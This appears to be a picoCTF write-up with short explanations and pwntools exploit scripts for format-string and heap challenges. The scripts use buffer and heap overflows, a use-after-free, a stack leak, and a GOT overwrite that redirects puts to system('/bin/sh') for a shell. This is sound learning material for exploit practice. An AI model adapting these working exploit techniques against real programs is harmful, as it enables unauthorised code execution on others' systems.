# Binary

## format string 0
It named 'format string' but just a ROP attack.<br />

![Image](fs01.png)

```Python
from pwn import *
e = ELF("format-string-0",checksec=False)
p = process("format-string-0")
#p = remote("mimas.picoctf.net",64654)
p.recv()
payload = b"A"*56

payload += p64(e.sym['sigsegv_handler'])

p.sendline(payload)
print(p.recvall())
```
## heap 0
Just a heap overflow.<br />
```Python
from pwn import *

p = remote("tethys.picoctf.net",55418)

print(p.recv())
p.sendline(b"2")
print(p.recv())
p.sendline(b"A"*36)
p.recv()
p.sendline(b"4")
print(p.recvall())
```
## format string 1
Just a format string vulnerability.<br />
Input '%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/' to read stacks.<br />

```Python
from pwn import *

# result of input '%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/'
s = "402118/0/7f827b710a00/0/215e880/a347834/7ffd65019fc0/7f827b501e60/7f827b7264d0/1/7ffd6501a090/0/0/7b4654436f636970/355f31346d316e34/3478345f33317937/34365f673431665f/7d363131373732/7/7f827b7288d8/2300000007/206e693374307250/a336c797453/9/7f827b739de9/7f827b50a098/7f827b7264d0/0/7ffd6501a0a0/2f786c252f786c25/2f786c252f786c25/2f786c252f786c252f786c252f786c25/2f786c252f786c25/2f786c252f786c25/2f786c252f786c25/"

words = s.split("/")

for w in words:
    try:
        print((bytes.fromhex(w).decode())[::-1],end="")
    except:
        print("/",end="")
```
## heap 1
Just a heap overflow<br />
```Python
from pwn import *

#p = process("chall")
p = remote("tethys.picoctf.net", 54557)

print(p.recv().decode())

p.sendline(b"2")

print(p.recv().decode())

payload = b"A"*32 + b"pico"

p.sendline(payload)

p.recv()
p.sendline(b"4")

print(p.recvall().decode())
```
## heap 2
Just a heap overflow.<br />
```C
void check_win() { ((void (*)())*(int*)x)(); }
```
This function runs function where address is x.<br />
So overwrite x into win().<br />

```Python
from pwn import *

p = process("chall")
e = ELF("chall",checksec=False)
#p = remote("mimas.picoctf.net", 51204)

print(p.recv().decode())

p.sendline(b"2")

print(p.recv())
payload = b"A"*32 + p64(e.sym['win'])

p.sendline(payload)

p.recvline()
p.sendline(b"4")
print(p.recvall().decode())
```
## heap 3
There's vulnerability of 'use after free'.<br />
malloc() took a same heap memory if malloc() took same size after free().<br />
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int main(void){
    //Check Size of object
    printf("%ld",sizeof(object));

    return 0;
}
```
The size of object is 34.<br />
1. Free x
2. Allocate object
3. Input size : 34
4. Input data : 'A'*30 + 'pico'
5. Check to win
## format string 2
There's format string vulnerability and I have to change the value of 'sus'.<br />
pwntools is powerful for solve this challenge.<br />
```Python
from pwn import *

p = process("vuln")
#p = remote("rhea.picoctf.net", 58588)

print(p.recv().decode())

elf = ELF('./vuln')
sus = elf.sym['sus']

context.clear(arch = 'amd64')

print(sus)

payload = fmtstr_payload(14,{sus : 0x67616c66})

print(payload.decode())
p.sendline(payload)

print(p.recvall().decode())
```
## format string 3
There's also format string vulnerability and there's interesting string, '/bin/sh'.<br />
Both 'puts' and 'system' are also take argument in RDI.<br />
So change the puts address to system, it's makes system('/bin/sh').<br />
There's GOT that hold address of libc,and we can get setvbuf address.<br />
Calculate system() address and overwrite, I can exploit successfully.
```Python
from pwn import *

e = ELF('format-string-3')
libc = ELF('libc.so.6')

p = process("format-string-3")
#p = remote("rhea.picoctf.net", 53699)

print(p.recvuntil(b"libc: ").decode())

libcSetvbuf = p.recvline().replace(b"\n",b"").decode()

print(libcSetvbuf)

putsGot = e.got['puts']
print("<elf> ::GOT     => " , hex(e.got['puts']))
print("<libc>::setvbuf    => ",hex(libc.sym['setvbuf']))
print("<libc>:::system => ",hex(libc.sym['system']))
context.clear(arch = 'amd64')

addr =libc.sym['system'] - libc.sym['setvbuf'] + int(libcSetvbuf,16)

payload = fmtstr_payload(38, {e.got['puts'] : addr})


print(payload)

p.sendline(payload)

p.interactive()
```